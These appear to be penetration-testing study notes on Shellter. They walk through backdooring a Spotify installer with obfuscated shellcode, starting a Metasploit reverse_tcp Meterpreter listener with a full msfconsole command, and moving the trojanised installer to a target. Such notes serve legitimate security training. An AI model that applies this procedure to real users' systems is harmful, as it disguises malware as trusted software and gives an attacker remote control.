- Shellter
	- designed to run on windows
	- dynamic shellcode injection tool 
		1.  uses a number of novel and advanced techniques to backdoor a valid and non-malicious executable file with a malicious shellcode payload
		2.  performs a thorough analysis of the target PE file and the execution paths
		3.  determines where it can inject our shellcode without relying on traditional injection techniques
		4. attempts to use the existing PE Import Address Table (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload
	- shelter pro = even more bad ass
	- example:
		1. apt-cache search shellter
		2.  sudo apt install shellter
			- /usr/share/windows-resources/shellter/shellter.exe
		3. add installer location of PE
			- **/home/kali/desktop/spotifysetup.exe**
		4. Stealth Mode
			- attempts to restore the execution flow of the PE post exploit
			- custom payloads need to terminate by exiting the current thread
		5. Set parameters
		6. Shelter will inject the payload into the Spotify installer and attempt to reach the first instruction of the payload
		7. Configure listener on Kali with the meterpreter payload.
			- msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;
		8. transfer backdoored installer over to the TGT
			- Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE
